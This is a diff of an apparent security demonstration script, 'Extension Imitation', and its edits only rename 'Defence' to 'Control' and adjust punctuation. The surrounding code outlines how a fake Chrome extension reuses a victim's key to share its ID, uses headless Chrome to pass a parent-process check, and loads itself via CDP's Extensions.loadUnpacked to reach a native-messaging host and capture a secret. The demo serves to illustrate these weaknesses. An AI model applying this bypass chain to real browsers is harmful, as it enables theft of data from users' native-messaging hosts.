@@ -34,11 +34,11 @@ CDP_PORT = 9226
 def banner():
     print("\n" + "="*65)
     print("  ATTACK 3: EXTENSION IMITATION")
-    print("  Fake extension uses same ID as victim — NM host admits it")
+    print("  Fake extension uses same ID as victim, NM host admits it")
     print("="*65)
 
-def defence(n, msg):
-    print(f"\n  Defence {n}: {msg}")
+def control(n, msg):
+    print(f"\n  Control {n}: {msg}")
 
 def step(n, title):
     print(f"\n  Step {n}: {title}")
@@ -116,12 +116,12 @@ def write_nm_manifest_in_profile(real_host_path, ext_id):
 def run_setup():
     banner()
 
-    print("\n  Defences in place:")
-    defence(1, "The NM manifest lists allowed_origins — Chrome only forwards "
+    print("\n  Controls in place:")
+    control(1, "The NM manifest lists allowed_origins, Chrome only forwards "
                "connections from the specific demo victim extension ID to this host.")
-    defence(2, "Chrome enforces developer mode — unpacked extensions cannot be "
+    control(2, "Chrome enforces developer mode, unpacked extensions cannot be "
                "loaded without manually enabling it in chrome://extensions.")
-    defence(3, "The demo victim host verifies its parent process is Google Chrome "
+    control(3, "The demo victim host verifies its parent process is Google Chrome "
                "before responding to any request.")
 
     pause()
@@ -140,7 +140,7 @@ def run_setup():
     info(f"Public key (first 60 chars): {key_b64[:60]}...")
     info(f"Derived extension ID:        {ext_id}")
 
-    bypass("Bypassing Defence 1: same key -> same ID -> allowed_origins check passes.")
+    bypass("Bypassing Control 1: same key -> same ID -> allowed_origins check passes.")
 
     pause()
 
@@ -165,9 +165,9 @@ def run_setup():
     info(f"NM manifest written to: {nm_path}")
     info(f"  -> Points to: {real_host_path}")
     info("")
-    info("Headless Chrome spawns the real host — its parent IS Chrome, so the parent check passes.")
+    info("Headless Chrome spawns the real host, its parent IS Chrome, so the parent check passes.")
 
-    bypass("Bypassing Defence 3: headless Chrome IS Chrome — parent check passes.")
+    bypass("Bypassing Control 3: headless Chrome IS Chrome, parent check passes.")
 
     pause()
 
@@ -178,7 +178,7 @@ def run_setup():
     info(f"CDP port {CDP_PORT} | WebSocket receiver ws://localhost:{WS_PORT}")
     info("")
 
-    bypass("Bypassing Defence 2: Extensions.loadUnpacked via CDP bypasses developer mode.")
+    bypass("Bypassing Control 2: Extensions.loadUnpacked via CDP bypasses developer mode.")
 
     asyncio.run(run_attack_async(key_b64, ext_id, fake_manifest_path))
 
@@ -272,7 +272,7 @@ async def run_attack_async(key_b64, ext_id, fake_manifest_path):
             loaded_id = resp.get("result", {}).get("id", "unknown")
 
         info(f"  Attacker headless Chrome launched (PID {proc.pid})")
-        info(f"  Fake extension loaded — ID: {loaded_id}")
+        info(f"  Fake extension loaded, ID: {loaded_id}")
         info("")
         info("  Waiting for the fake extension to connect to the real demo victim host...")
         info("  Press Ctrl+C to stop.")
@@ -286,7 +286,7 @@ async def run_attack_async(key_b64, ext_id, fake_manifest_path):
             elapsed += 0.5
 
         if stolen_secret[0] is None:
-            info(f"  Timed out after {timeout}s — fake extension did not report a secret.")
+            info(f"  Timed out after {timeout}s, fake extension did not report a secret.")
 
     cleanup()
 
